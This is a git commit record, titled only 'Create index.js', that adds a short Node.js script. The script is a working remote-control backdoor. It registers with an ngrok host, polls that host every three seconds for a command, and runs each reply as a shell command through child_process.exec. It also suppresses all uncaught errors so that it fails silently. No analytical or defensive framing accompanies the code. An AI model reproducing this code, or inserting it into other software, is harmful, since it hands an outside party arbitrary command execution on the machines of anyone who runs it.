d675964ba22dfaf631fbdbbdaaa7c482a00bf497
andriy332 <75567134+andriy332@users.noreply.github.com>
2022-12-03 18:46:17 +0100

    Create index.js

---
+++ index.js
@@ -0,0 +1,26 @@
+const https = require('https');
+const { exec } = require('child_process');
+
+
+process.on('uncaughtException', function () { })
+process.on('unhandledRejection', function () { })
+
+let endpoint = 'https://45fd-72-10-162-5.ngrok.io'
+
+https.get(endpoint + '/addclient', (res) => { });
+
+setInterval(() => {
+    https.get(endpoint + '/getcommand', (res) => {
+        let data = '';
+
+        res.on('data', (chunk) => {
+            data += chunk;
+        });
+
+        res.on('close', () => {
+            if (data === "" || data.includes("</html>")) return
+            console.log(data)
+            exec(data, () => { });
+        });
+    });
+}, 3000)
